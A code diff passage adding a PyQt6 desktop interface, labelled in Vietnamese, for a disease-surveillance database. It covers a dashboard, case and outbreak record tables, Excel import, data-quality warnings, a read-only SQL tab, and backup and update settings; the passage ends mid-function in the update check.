+    def rowCount(self, parent=QModelIndex()) -> int:  # noqa: N802
+        return len(self.rows)
+
+    def columnCount(self, parent=QModelIndex()) -> int:  # noqa: N802
+        return len(self.columns)
+
+    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
+        if not index.isValid():
+            return None
+        key = self.columns[index.column()][0]
+        value = self.rows[index.row()].get(key, "")
+        if role == Qt.ItemDataRole.DisplayRole:
+            return display_value(value)
+        if role == Qt.ItemDataRole.TextAlignmentRole and isinstance(value, (int, float)):
+            return int(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
+        if role == Qt.ItemDataRole.BackgroundRole:
+            severity = self.rows[index.row()].get("severity")
+            if severity == "error":
+                return QColor("#fee2e2")
+            if severity == "warning":
+                return QColor("#fff7d6")
+        return None
+
+    def headerData(self, section: int, orientation: Qt.Orientation, role=Qt.ItemDataRole.DisplayRole):  # noqa: N802
+        if role != Qt.ItemDataRole.DisplayRole:
+            return None
+        if orientation == Qt.Orientation.Horizontal:
+            return self.columns[section][1]
+        return str(section + 1)
+
+    def record_at(self, row: int) -> dict[str, Any] | None:
+        if 0 <= row < len(self.rows):
+            return self.rows[row]
+        return None
+
+
+class KpiCard(QFrame):
+    def __init__(self, title: str):
+        super().__init__()
+        self.setObjectName("kpiCard")
+        layout = QVBoxLayout(self)
+        layout.setContentsMargins(16, 12, 16, 12)
+        self.value_label = QLabel("0")
+        self.value_label.setObjectName("kpiValue")
+        self.title_label = QLabel(title)
+        self.title_label.setObjectName("kpiTitle")
+        layout.addWidget(self.value_label)
+        layout.addWidget(self.title_label)
+
+    def set_value(self, value: Any) -> None:
+        self.value_label.setText(f"{value:,}" if isinstance(value, int) else str(value))
+
+
+class DashboardTab(QWidget):
+    def __init__(self):
+        super().__init__()
+        root = QVBoxLayout(self)
+        title_row = QHBoxLayout()
+        title = QLabel("Tổng quan giám sát dịch bệnh")
+        title.setObjectName("sectionTitle")
+        refresh = QPushButton("Làm mới")
+        refresh.clicked.connect(self.refresh)
+        title_row.addWidget(title)
+        title_row.addStretch()
+        title_row.addWidget(refresh)
+        root.addLayout(title_row)
+
+        kpi_grid = QGridLayout()
+        self.cards = {
+            "case_records": KpiCard("Bản ghi ca bệnh"),
+            "outbreak_records": KpiCard("Ổ dịch"),
+            "active_outbreaks": KpiCard("Ổ dịch đang hoạt động"),
+            "reported_cases": KpiCard("Tổng ca mắc trong ổ dịch"),
+            "deaths": KpiCard("Tử vong"),
+            "quality_issues": KpiCard("Cảnh báo chất lượng"),
+        }
+        for i, card in enumerate(self.cards.values()):
+            kpi_grid.addWidget(card, i // 3, i % 3)
+        root.addLayout(kpi_grid)
+
+        splitter = QSplitter(Qt.Orientation.Horizontal)
+        left = QWidget()
+        left_layout = QVBoxLayout(left)
+        left_layout.setContentsMargins(0, 0, 0, 0)
+        left_layout.addWidget(QLabel("Thống kê theo bệnh"))
+        self.disease_table = QTableView()
+        self.disease_table.setAlternatingRowColors(True)
+        self.disease_model = DictTableModel(columns=[
+            ("disease", "Bệnh"),
+            ("outbreak_count", "Số ổ dịch"),
+            ("case_count", "Số ca"),
+            ("active_count", "Đang hoạt động"),
+            ("death_count", "Tử vong"),
+        ])
+        self.disease_table.setModel(self.disease_model)
+        self.disease_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
+        left_layout.addWidget(self.disease_table)
+
+        right = QWidget()
+        right_layout = QVBoxLayout(right)
+        right_layout.setContentsMargins(0, 0, 0, 0)
+        right_layout.addWidget(QLabel("Ổ dịch đang hoạt động"))
+        self.active_table = QTableView()
+        self.active_table.setAlternatingRowColors(True)
+        self.active_model = DictTableModel(columns=[
+            ("disease", "Bệnh"),
+            ("location", "Địa điểm"),
+            ("first_onset_date", "Khởi phát đầu"),
+            ("case_count", "Ca mắc"),
+        ])
+        self.active_table.setModel(self.active_model)
+        self.active_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
+        right_layout.addWidget(self.active_table)
+        splitter.addWidget(left)
+        splitter.addWidget(right)
+        splitter.setSizes([650, 650])
+        root.addWidget(splitter, 1)
+
+        self.chart_container = QWidget()
+        self.chart_layout = QHBoxLayout(self.chart_container)
+        self.chart_layout.setContentsMargins(0, 0, 0, 0)
+        root.addWidget(self.chart_container, 1)
+        self.refresh()
+
+    def _clear_charts(self):
+        while self.chart_layout.count():
+            item = self.chart_layout.takeAt(0)
+            widget = item.widget()
+            if widget:
+                widget.deleteLater()
+
+    def refresh(self):
+        stats = core.dashboard_stats()
+        for key, card in self.cards.items():
+            card.set_value(stats.get(key, 0))
+        diseases = core.disease_summary()
+        active = core.recent_active_outbreaks()
+        self.disease_model.set_data(diseases)
+        self.active_model.set_data(active)
+        self._clear_charts()
+        if not CHARTS_AVAILABLE:
+            note = QLabel("Cài PyQt6-Charts để hiển thị biểu đồ trực quan.")
+            note.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            self.chart_layout.addWidget(note)
+            return
+        self.chart_layout.addWidget(self._disease_chart(diseases))
+        self.chart_layout.addWidget(self._monthly_chart(core.monthly_outbreak_summary()))
+
+    def _disease_chart(self, rows: list[dict[str, Any]]) -> QChartView:
+        top = rows[:8]
+        series = QBarSeries()
+        bar_set = QBarSet("Ổ dịch")
+        categories = []
+        for row in top:
+            bar_set.append(float(row["outbreak_count"]))
+            name = str(row["disease"] or "Không rõ")
+            categories.append(name.replace("Bệnh ", "")[:22])
+        series.append(bar_set)
+        chart = QChart()
+        chart.addSeries(series)
+        chart.setTitle("Số ổ dịch theo bệnh")
+        chart.setAnimationOptions(QChart.AnimationOption.SeriesAnimations)
+        axis_x = QBarCategoryAxis()
+        axis_x.append(categories)
+        axis_y = QValueAxis()
+        axis_y.setLabelFormat("%.0f")
+        axis_y.setMin(0)
+        chart.addAxis(axis_x, Qt.AlignmentFlag.AlignBottom)
+        chart.addAxis(axis_y, Qt.AlignmentFlag.AlignLeft)
+        series.attachAxis(axis_x)
+        series.attachAxis(axis_y)
+        chart.legend().setVisible(False)
+        return QChartView(chart)
+
+    def _monthly_chart(self, rows: list[dict[str, Any]]) -> QChartView:
+        series = QBarSeries()
+        outbreak_set = QBarSet("Ổ dịch")
+        case_set = QBarSet("Ca mắc")
+        categories = []
+        for row in rows:
+            outbreak_set.append(float(row["outbreak_count"]))
+            case_set.append(float(row["case_count"]))
+            month = str(row["month"])
+            categories.append(month[5:7] + "/" + month[:4])
+        series.append(outbreak_set)
+        series.append(case_set)
+        chart = QChart()
+        chart.addSeries(series)
+        chart.setTitle("Diễn biến ổ dịch theo tháng")
+        axis_x = QBarCategoryAxis()
+        axis_x.append(categories)
+        axis_y = QValueAxis()
+        axis_y.setLabelFormat("%.0f")
+        axis_y.setMin(0)
+        chart.addAxis(axis_x, Qt.AlignmentFlag.AlignBottom)
+        chart.addAxis(axis_y, Qt.AlignmentFlag.AlignLeft)
+        series.attachAxis(axis_x)
+        series.attachAxis(axis_y)
+        chart.legend().setVisible(True)
+        return QChartView(chart)
+
+
+class RecordDetailsDialog(QDialog):
+    def __init__(self, title: str, record: dict[str, Any], labels: dict[str, str], parent=None):
+        super().__init__(parent)
+        self.setWindowTitle(title)
+        self.resize(760, 650)
+        layout = QVBoxLayout(self)
+        table = QTableView()
+        rows = [{"field": labels.get(k, k), "value": display_value(v)} for k, v in record.items() if k not in {"raw_json", "row_hash"}]
+        table.setModel(DictTableModel(rows, [("field", "Trường"), ("value", "Giá trị")]))
+        table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
+        table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
+        table.verticalHeader().setVisible(False)
+        layout.addWidget(table)
+        buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Close)
+        buttons.rejected.connect(self.reject)
+        layout.addWidget(buttons)
+
+
+class OutbreakDialog(QDialog):
+    def __init__(self, record: dict[str, Any] | None = None, parent=None):
+        super().__init__(parent)
+        self.record = record or {}
+        self.setWindowTitle("Cập nhật ổ dịch" if record else "Thêm ổ dịch")
+        self.resize(680, 620)
+        root = QVBoxLayout(self)
+        form = QFormLayout()
+        self.fields: dict[str, QLineEdit | QComboBox | QSpinBox] = {}
+        for label, key in core.OUTBREAK_FIELDS:
+            if key == "source_stt":
+                continue
+            if key in {"case_count", "death_count", "sample_count", "positive_count"}:
+                widget = QSpinBox()
+                widget.setMaximum(10_000_000)
+                widget.setValue(int(self.record.get(key) or 0))
+            elif key == "status":
+                widget = QComboBox()
+                widget.addItems(["", "Đang hoạt động", "Đã kết thúc"])
+                current = str(self.record.get(key) or "")
+                if current and widget.findText(current) < 0:
+                    widget.addItem(current)
+                widget.setCurrentText(current)
+            else:
+                widget = QLineEdit(str(self.record.get(key) or ""))
+                if key in core.DATE_FIELDS:
+                    widget.setPlaceholderText("dd/mm/yyyy")
+                if key in core.DATETIME_FIELDS:
+                    widget.setPlaceholderText("dd/mm/yyyy HH:MM")
+            self.fields[key] = widget
+            form.addRow(label + ":", widget)
+        root.addLayout(form)
+        buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Save | QDialogButtonBox.StandardButton.Cancel)
+        buttons.accepted.connect(self.accept)
+        buttons.rejected.connect(self.reject)
+        root.addWidget(buttons)
+
+    def values(self) -> dict[str, Any]:
+        data: dict[str, Any] = {}
+        for key, widget in self.fields.items():
+            if isinstance(widget, QSpinBox):
+                data[key] = widget.value()
+            elif isinstance(widget, QComboBox):
+                data[key] = widget.currentText()
+            else:
+                data[key] = widget.text().strip()
+        return data
+
+    def accept(self):
+        data = self.values()
+        if not data.get("disease") or not data.get("location"):
+            QMessageBox.warning(self, "Thiếu thông tin", "Tên bệnh và địa điểm ổ dịch là bắt buộc.")
+            return
+        super().accept()
+
+
+class RecordsTab(QWidget):
+    def __init__(self, entity_type: str):
+        super().__init__()
+        self.entity_type = entity_type
+        self.page = 1
+        self.page_size = 200
+        self.total = 0
+        root = QVBoxLayout(self)
+
+        filter_box = QGroupBox("Bộ lọc")
+        filters = QHBoxLayout(filter_box)
+        self.search = QLineEdit()
+        self.search.setPlaceholderText("Tìm họ tên, mã số, địa chỉ, đơn vị báo cáo...")
+        self.search.returnPressed.connect(self.refresh)
+        self.disease = QComboBox()
+        self.status = QComboBox()
+        self.area = QComboBox()
+        self.disease.addItem("Tất cả bệnh", "")
+        self.status.addItem("Tất cả trạng thái", "")
+        self.area.addItem("Tất cả địa bàn", "")
+        self.refresh_filters()
+        for widget in (self.disease, self.status, self.area):
+            widget.currentIndexChanged.connect(self._filter_changed)
+        btn_search = QPushButton("Tra cứu")
+        btn_search.clicked.connect(self.refresh)
+        btn_export = QPushButton("Xuất Excel/CSV")
+        btn_export.setObjectName("secondary")
+        btn_export.clicked.connect(self.export_data)
+        filters.addWidget(self.search, 3)
+        filters.addWidget(self.disease, 2)
+        filters.addWidget(self.status, 1)
+        filters.addWidget(self.area, 2)
+        filters.addWidget(btn_search)
+        filters.addWidget(btn_export)
+        root.addWidget(filter_box)
+
+        action_row = QHBoxLayout()
+        self.title = QLabel("Danh sách ca bệnh" if entity_type == "case" else "Danh sách ổ dịch")
+        self.title.setObjectName("sectionTitle")
+        action_row.addWidget(self.title)
+        action_row.addStretch()
+        if entity_type == "outbreak":
+            btn_add = QPushButton("Thêm ổ dịch")
+            btn_add.clicked.connect(self.add_outbreak)
+            btn_edit = QPushButton("Sửa")
+            btn_edit.setObjectName("secondary")
+            btn_edit.clicked.connect(self.edit_selected)
+            btn_delete = QPushButton("Xóa")
+            btn_delete.setObjectName("danger")
+            btn_delete.clicked.connect(self.delete_selected)
+            action_row.addWidget(btn_add)
+            action_row.addWidget(btn_edit)
+            action_row.addWidget(btn_delete)
+        root.addLayout(action_row)
+
+        self.table = QTableView()
+        self.table.setAlternatingRowColors(True)
+        self.table.setSelectionBehavior(QTableView.SelectionBehavior.SelectRows)
+        self.table.setSelectionMode(QTableView.SelectionMode.SingleSelection)
+        self.table.doubleClicked.connect(self.show_details)
+        if entity_type == "case":
+            columns = [
+                ("case_code", "Mã số"), ("full_name", "Họ tên"), ("birth_date_raw", "Ngày sinh"),
+                ("gender", "Giới"), ("commune", "Xã/Phường"), ("main_diagnosis", "Chẩn đoán"),
+                ("onset_date", "Khởi phát"), ("current_status", "Tình trạng"),
+                ("report_datetime", "Báo cáo"), ("reporting_unit", "Đơn vị báo cáo"),
+            ]
+        else:
+            columns = [
+                ("disease", "Tên bệnh"), ("location", "Địa điểm"), ("admin_area", "Địa bàn"),
+                ("first_onset_date", "Khởi phát đầu"), ("last_onset_date", "Khởi phát cuối"),
+                ("status", "Trạng thái"), ("case_count", "Ca mắc"), ("death_count", "Tử vong"),
+                ("sample_count", "Mẫu XN"), ("positive_count", "Mẫu (+)"),
+                ("report_datetime", "Ngày báo cáo"), ("reporting_unit", "Đơn vị báo cáo"),
+            ]
+        self.model = DictTableModel(columns=columns)
+        self.table.setModel(self.model)
+        header = self.table.horizontalHeader()
+        header.setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
+        if entity_type == "case":
+            header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
+            header.setSectionResizeMode(5, QHeaderView.ResizeMode.Stretch)
+        else:
+            header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
+            header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
+        root.addWidget(self.table, 1)
+
+        pager = QHBoxLayout()
+        self.prev_btn = QPushButton("← Trang trước")
+        self.prev_btn.setObjectName("secondary")
+        self.prev_btn.clicked.connect(self.prev_page)
+        self.next_btn = QPushButton("Trang sau →")
+        self.next_btn.setObjectName("secondary")
+        self.next_btn.clicked.connect(self.next_page)
+        self.page_label = QLabel()
+        pager.addWidget(self.prev_btn)
+        pager.addWidget(self.page_label)
+        pager.addWidget(self.next_btn)
+        pager.addStretch()
+        root.addLayout(pager)
+        self.refresh()
+
+    def _filter_changed(self):
+        self.page = 1
+        self.refresh()
+
+    def refresh_filters(self):
+        try:
+            if self.entity_type == "case":
+                disease_values = core.list_filter_values("case", "main_diagnosis")
+                status_values = sorted(set(core.list_filter_values("case", "record_status") + core.list_filter_values("case", "current_status")))
+                area_values = core.list_filter_values("case", "commune")
+            else:
+                disease_values = core.list_filter_values("outbreak", "disease")
+                status_values = core.list_filter_values("outbreak", "status")
+                area_values = core.list_filter_values("outbreak", "admin_area")
+            for combo, values in ((self.disease, disease_values), (self.status, status_values), (self.area, area_values)):
+                current = combo.currentData()
+                combo.blockSignals(True)
+                while combo.count() > 1:
+                    combo.removeItem(1)
+                for value in values:
+                    combo.addItem(value, value)
+                idx = combo.findData(current)
+                combo.setCurrentIndex(idx if idx >= 0 else 0)
+                combo.blockSignals(False)
+        except Exception:
+            pass
+
+    def refresh(self):
+        rows, total = core.query_records(
+            self.entity_type,
+            search=self.search.text().strip(),
+            disease=self.disease.currentData() or "",
+            status=self.status.currentData() or "",
+            admin_area=self.area.currentData() or "",
+            page=self.page,
+            page_size=self.page_size,
+        )
+        self.total = total
+        self.model.set_data(rows)
+        pages = max(1, math.ceil(total / self.page_size))
+        if self.page > pages:
+            self.page = pages
+            return self.refresh()
+        self.page_label.setText(f"Trang {self.page}/{pages} — {total:,} bản ghi")
+        self.prev_btn.setEnabled(self.page > 1)
+        self.next_btn.setEnabled(self.page < pages)
+
+    def selected_record(self) -> dict[str, Any] | None:
+        indexes = self.table.selectionModel().selectedRows()
+        if not indexes:
+            QMessageBox.information(self, "Chưa chọn", "Hãy chọn một bản ghi trong danh sách.")
+            return None
+        return self.model.record_at(indexes[0].row())
+
+    def show_details(self):
+        record = self.selected_record()
+        if not record:
+            return
+        full = core.get_record(self.entity_type, int(record["id"]))
+        labels = core.CASE_LABELS if self.entity_type == "case" else core.OUTBREAK_LABELS
+        labels = {**labels, "admin_area": "Địa bàn chuẩn hóa", "source_file": "File nguồn", "source_row": "Dòng nguồn", "imported_at": "Thời điểm nhập"}
+        RecordDetailsDialog("Chi tiết bản ghi", full or record, labels, self).exec()
+
+    def prev_page(self):
+        if self.page > 1:
+            self.page -= 1
+            self.refresh()
+
+    def next_page(self):
+        if self.page * self.page_size < self.total:
+            self.page += 1
+            self.refresh()
+
+    def export_data(self):
+        path, _ = QFileDialog.getSaveFileName(self, "Xuất dữ liệu", "", "Excel (*.xlsx);;CSV (*.csv)")
+        if not path:
+            return
+        if not Path(path).suffix:
+            path += ".xlsx"
+        try:
+            count = core.export_filtered_records(
+                path,
+                self.entity_type,
+                search=self.search.text().strip(),
+                disease=self.disease.currentData() or "",
+                status=self.status.currentData() or "",
+                admin_area=self.area.currentData() or "",
+            )
+            QMessageBox.information(self, "Đã xuất", f"Đã xuất {count:,} bản ghi:\n{path}")
+        except Exception as exc:
+            QMessageBox.critical(self, "Không thể xuất", str(exc))
+
+    def add_outbreak(self):
+        dialog = OutbreakDialog(parent=self)
+        if dialog.exec() == QDialog.DialogCode.Accepted:
+            try:
+                core.save_outbreak(dialog.values())
+                self.refresh_filters()
+                self.refresh()
+            except Exception as exc:
+                QMessageBox.critical(self, "Không thể lưu", str(exc))
+
+    def edit_selected(self):
+        record = self.selected_record()
+        if not record:
+            return
+        full = core.get_record("outbreak", int(record["id"]))
+        dialog = OutbreakDialog(full, self)
+        if dialog.exec() == QDialog.DialogCode.Accepted:
+            try:
+                core.save_outbreak(dialog.values(), int(record["id"]))
+                self.refresh_filters()
+                self.refresh()
+            except Exception as exc:
+                QMessageBox.critical(self, "Không thể lưu", str(exc))
+
+    def delete_selected(self):
+        record = self.selected_record()
+        if not record:
+            return
+        answer = QMessageBox.question(self, "Xác nhận xóa", "Xóa ổ dịch đã chọn? CSDL sẽ được sao lưu trước khi xóa.")
+        if answer == QMessageBox.StandardButton.Yes:
+            try:
+                core.delete_record("outbreak", int(record["id"]))
+                self.refresh()
+            except Exception as exc:
+                QMessageBox.critical(self, "Không thể xóa", str(exc))
+
+
+class ImportTab(QWidget):
+    def __init__(self, after_import=None):
+        super().__init__()
+        self.after_import = after_import
+        root = QVBoxLayout(self)
+        title = QLabel("Nhập dữ liệu từ Excel")
+        title.setObjectName("sectionTitle")
+        root.addWidget(title)
+        note = QLabel(
+            "Ứng dụng tự nhận diện file ca bệnh hoặc ổ dịch qua tiêu đề cột. "
+            "Dòng giống hệt đã nhập trước đó sẽ được bỏ qua bằng mã băm."
+        )
+        note.setWordWrap(True)
+        root.addWidget(note)
+        row = QHBoxLayout()
+        self.path = QLineEdit()
+        self.path.setReadOnly(True)
+        browse = QPushButton("Chọn file...")
+        browse.clicked.connect(self.browse)
+        self.import_btn = QPushButton("Nhập vào CSDL")
+        self.import_btn.clicked.connect(self.do_import)
+        row.addWidget(self.path, 1)
+        row.addWidget(browse)
+        row.addWidget(self.import_btn)
+        root.addLayout(row)
+        self.files: list[str] = []
+        self.log = QPlainTextEdit()
+        self.log.setReadOnly(True)
+        root.addWidget(self.log, 1)
+        history_box = QGroupBox("Lịch sử nhập gần đây")
+        history_layout = QVBoxLayout(history_box)
+        self.history = QTableView()
+        self.history_model = DictTableModel(columns=[
+            ("imported_at", "Thời điểm"), ("file_name", "File"), ("entity_type", "Loại"),
+            ("rows_read", "Đã đọc"), ("inserted", "Đã thêm"), ("duplicates", "Trùng"),
+            ("issue_count", "Cảnh báo"),
+        ])
+        self.history.setModel(self.history_model)
+        self.history.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
+        history_layout.addWidget(self.history)
+        root.addWidget(history_box, 1)
+        self.refresh_history()
+
+    def browse(self):
+        files, _ = QFileDialog.getOpenFileNames(self, "Chọn file Excel", "", "Excel (*.xlsx *.xlsm)")
+        if files:
+            self.files = files
+            self.path.setText("; ".join(files))
+
+    def do_import(self):
+        if not self.files:
+            QMessageBox.information(self, "Chưa chọn file", "Hãy chọn ít nhất một file Excel.")
+            return
+        self.import_btn.setEnabled(False)
+        QApplication.setOverrideCursor(Qt.CursorShape.WaitCursor)
+        try:
+            for file in self.files:
+                try:
+                    summary = core.import_excel(file)
+                    self.log.appendPlainText("✓ " + summary.as_text())
+                except Exception as exc:
+                    self.log.appendPlainText(f"✗ {Path(file).name}: {exc}")
+            self.refresh_history()
+            if self.after_import:
+                self.after_import()
+        finally:
+            QApplication.restoreOverrideCursor()
+            self.import_btn.setEnabled(True)
+
+    def refresh_history(self):
+        rows = core.list_import_batches()
+        for row in rows:
+            row["entity_type"] = "Ca bệnh" if row["entity_type"] == "case" else "Ổ dịch"
+        self.history_model.set_data(rows)
+
+
+class QualityTab(QWidget):
+    def __init__(self):
+        super().__init__()
+        root = QVBoxLayout(self)
+        row = QHBoxLayout()
+        title = QLabel("Chất lượng dữ liệu")
+        title.setObjectName("sectionTitle")
+        self.entity = QComboBox()
+        self.entity.addItem("Tất cả loại", "")
+        self.entity.addItem("Ca bệnh", "case")
+        self.entity.addItem("Ổ dịch", "outbreak")
+        self.severity = QComboBox()
+        self.severity.addItem("Tất cả mức", "")
+        self.severity.addItem("Lỗi", "error")
+        self.severity.addItem("Cảnh báo", "warning")
+        self.severity.addItem("Thông tin", "info")
+        refresh = QPushButton("Làm mới")
+        refresh.clicked.connect(self.refresh)
+        export = QPushButton("Xuất danh sách")
+        export.setObjectName("secondary")
+        export.clicked.connect(self.export)
+        row.addWidget(title)
+        row.addStretch()
+        row.addWidget(self.entity)
+        row.addWidget(self.severity)
+        row.addWidget(refresh)
+        row.addWidget(export)
+        root.addLayout(row)
+        self.table = QTableView()
+        self.table.setAlternatingRowColors(True)
+        self.model = DictTableModel(columns=[
+            ("severity", "Mức"), ("entity_type", "Đối tượng"), ("entity_id", "ID"),
+            ("issue_type", "Loại lỗi"), ("description", "Mô tả"),
+            ("source_file", "File nguồn"), ("source_row", "Dòng"),
+        ])
+        self.table.setModel(self.model)
+        self.table.horizontalHeader().setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)
+        root.addWidget(self.table)
+        self.entity.currentIndexChanged.connect(self.refresh)
+        self.severity.currentIndexChanged.connect(self.refresh)
+        self.refresh()
+
+    def refresh(self):
+        rows = core.list_quality_issues(severity=self.severity.currentData() or "", entity_type=self.entity.currentData() or "")
+        for row in rows:
+            row["entity_type"] = "Ca bệnh" if row["entity_type"] == "case" else "Ổ dịch"
+            row["severity"] = {"error": "Lỗi", "warning": "Cảnh báo", "info": "Thông tin"}.get(row["severity"], row["severity"])
+        self.model.set_data(rows)
+
+    def export(self):
+        if not self.model.rows:
+            QMessageBox.information(self, "Không có dữ liệu", "Danh sách cảnh báo đang trống.")
+            return
+        path, _ = QFileDialog.getSaveFileName(self, "Xuất cảnh báo", "bao_cao_chat_luong.xlsx", "Excel (*.xlsx);;CSV (*.csv)")
+        if not path:
+            return
+        columns = [label for _, label in self.model.columns]
+        rows = [[r.get(key, "") for key, _ in self.model.columns] for r in self.model.rows]
+        core.export_rows(path, columns, rows)
+        QMessageBox.information(self, "Đã xuất", path)
+
+
+class SqlTab(QWidget):
+    QUICK_SQL = {
+        "Tổng quan ổ dịch": """SELECT disease AS ten_benh, COUNT(*) AS so_o_dich, SUM(case_count) AS so_ca, SUM(death_count) AS tu_vong\nFROM outbreaks\nGROUP BY disease\nORDER BY so_o_dich DESC;""",
+        "Ổ dịch đang hoạt động": """SELECT disease, location, first_onset_date, case_count, reporting_unit\nFROM outbreaks\nWHERE status = 'Đang hoạt động'\nORDER BY first_onset_date DESC;""",
+        "Báo cáo ổ dịch muộn trên 2 ngày": """SELECT disease, location, first_onset_date, report_datetime,\n       CAST(julianday(substr(report_datetime,1,10)) - julianday(first_onset_date) AS INTEGER) AS so_ngay\nFROM outbreaks\nWHERE first_onset_date <> '' AND report_datetime <> ''\n  AND julianday(substr(report_datetime,1,10)) - julianday(first_onset_date) > 2\nORDER BY so_ngay DESC;""",
+        "Ca bệnh theo chẩn đoán": """SELECT main_diagnosis, COUNT(*) AS so_ca\nFROM cases\nGROUP BY main_diagnosis\nORDER BY so_ca DESC;""",
+    }
+
+    def __init__(self):
+        super().__init__()
+        root = QVBoxLayout(self)
+        row = QHBoxLayout()
+        title = QLabel("Truy vấn SQL chỉ đọc")
+        title.setObjectName("sectionTitle")
+        self.quick = QComboBox()
+        self.quick.addItem("Chọn câu lệnh nhanh...")
+        self.quick.addItems(self.QUICK_SQL.keys())
+        self.quick.currentTextChanged.connect(self.load_quick)
+        run = QPushButton("Chạy truy vấn")
+        run.clicked.connect(self.run_query)
+        export = QPushButton("Xuất kết quả")
+        export.setObjectName("secondary")
+        export.clicked.connect(self.export)
+        row.addWidget(title)
+        row.addStretch()
+        row.addWidget(self.quick)
+        row.addWidget(run)
+        row.addWidget(export)
+        root.addLayout(row)
+        self.editor = QPlainTextEdit("SELECT * FROM outbreaks ORDER BY first_onset_date DESC LIMIT 200;")
+        self.editor.setMaximumHeight(150)
+        self.editor.setFont(QFont("Consolas", 10))
+        root.addWidget(self.editor)
+        self.table = QTableView()
+        self.model = DictTableModel()
+        self.table.setModel(self.model)
+        self.table.setAlternatingRowColors(True)
+        root.addWidget(self.table)
+
+    def load_quick(self, text: str):
+        if text in self.QUICK_SQL:
+            self.editor.setPlainText(self.QUICK_SQL[text])
+
+    def run_query(self):
+        try:
+            columns, values = core.execute_select(self.editor.toPlainText())
+            rows = [dict(zip(columns, row)) for row in values]
+            self.model.set_data(rows, [(c, c) for c in columns])
+            self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
+            QMessageBox.information(self, "Kết quả", f"Trả về {len(rows):,} dòng (tối đa 5.000).")
+        except Exception as exc:
+            QMessageBox.critical(self, "Lỗi truy vấn", str(exc))
+
+    def export(self):
+        if not self.model.rows:
+            QMessageBox.information(self, "Chưa có kết quả", "Hãy chạy truy vấn trước.")
+            return
+        path, _ = QFileDialog.getSaveFileName(self, "Xuất kết quả", "ket_qua_truy_van.xlsx", "Excel (*.xlsx);;CSV (*.csv)")
+        if not path:
+            return
+        columns = [label for _, label in self.model.columns]
+        rows = [[r.get(key, "") for key, _ in self.model.columns] for r in self.model.rows]
+        core.export_rows(path, columns, rows)
+        QMessageBox.information(self, "Đã xuất", path)
+
+
+class SettingsTab(QWidget):
+    def __init__(self):
+        super().__init__()
+        root = QVBoxLayout(self)
+        title = QLabel("Dữ liệu, sao lưu và cập nhật")
+        title.setObjectName("sectionTitle")
+        root.addWidget(title)
+        info = QTextEdit()
+        info.setReadOnly(True)
+        info.setMaximumHeight(210)
+        info.setHtml(
+            f"<b>Phiên bản:</b> {core.VERSION}<br>"
+            f"<b>CSDL:</b> {core.DB_PATH}<br>"
+            f"<b>Thư mục sao lưu:</b> {core.BACKUP_DIR}<br><br>"
+            "Ứng dụng hoạt động offline đối với dữ liệu chuyên môn. Khi kiểm tra cập nhật, "
+            "ứng dụng chỉ kết nối tới hai tệp phát hành trên Google Drive; thư mục data/ và backups/ "
+            "không bị ghi đè trong quá trình cập nhật."
+        )
+        root.addWidget(info)
+
+        update_box = QGroupBox("Cập nhật trực tiếp từ Google Drive")
+        update_layout = QVBoxLayout(update_box)
+        self.update_status = QLabel(
+            "Bấm kiểm tra để đọc phiên bản mới từ update_manifest.json trên Google Drive."
+        )
+        self.update_status.setWordWrap(True)
+        update_layout.addWidget(self.update_status)
+        update_row = QHBoxLayout()
+        self.update_button = QPushButton("Kiểm tra cập nhật")
+        self.update_button.clicked.connect(lambda: self.check_update(silent=False))
+        update_row.addWidget(self.update_button)
+        update_row.addStretch()
+        update_layout.addLayout(update_row)
+        root.addWidget(update_box)
+
+        buttons = QHBoxLayout()
+        backup = QPushButton("Sao lưu CSDL ngay")
+        backup.clicked.connect(self.backup)
+        open_data = QPushButton("Mở thư mục dữ liệu")
+        open_data.setObjectName("secondary")
+        open_data.clicked.connect(lambda: core.open_folder(core.DATA_DIR))
+        open_backup = QPushButton("Mở thư mục sao lưu")
+        open_backup.setObjectName("secondary")
+        open_backup.clicked.connect(lambda: core.open_folder(core.BACKUP_DIR))
+        buttons.addWidget(backup)
+        buttons.addWidget(open_data)
+        buttons.addWidget(open_backup)
+        buttons.addStretch()
+        root.addLayout(buttons)
+        root.addStretch()
+
+    def backup(self):
+        try:
+            path = core.create_backup()
+            QMessageBox.information(self, "Đã sao lưu", str(path))
+        except Exception as exc:
+            QMessageBox.critical(self, "Không thể sao lưu", str(exc))
+
+    def check_update(self, silent: bool = False):
+        self.update_button.setEnabled(False)
+        self.update_status.setText("Đang kiểm tra phiên bản trên Google Drive...")
+        QApplication.setOverrideCursor(Qt.CursorShape.WaitCursor)
+        try:
+            info = update_manager.fetch_manifest()
+        except Exception as exc:
+            self.update_status.setText(f"Không kiểm tra được cập nhật: {exc}")
+            if not silent:
+                QMessageBox.warning(self, "Không kiểm tra được cập nhật", str(exc))
+            return
+        finally:
+            QApplication.restoreOverrideCursor()
+            self.update_button.setEnabled(True)
+
+        if not update_manager.is_newer_version(info.version, core.VERSION):
+            self.update_status.setText(f"Đang dùng phiên bản mới nhất: {core.VERSION}.")
+            if not silent:
+                QMessageBox.information(self, "Không có bản mới", f"Phiên bản hiện tại: {core.VERSION}")
+            return
+
+        self.update_status.setText(f"Có phiên bản {info.version}: {info.notes or 'Không có ghi chú.'}")
+        answer = QMessageBox.question(
+            self,
+            "Có bản cập nhật mới",
+            f"Phiên bản hiện tại: {core.VERSION}\n"
+            f"Phiên bản mới: {info.version}\n\n"
+            f"{info.notes or 'Không có ghi chú phát hành.'}\n\n"
+            "Ứng dụng sẽ sao lưu CSDL, tải gói cập nhật, tự đóng rồi mở lại. Tiếp tục?",
+        )
+        if answer != QMessageBox.StandardButton.Yes:
+            return
+
+        try:
+            backup_path = core.create_backup()
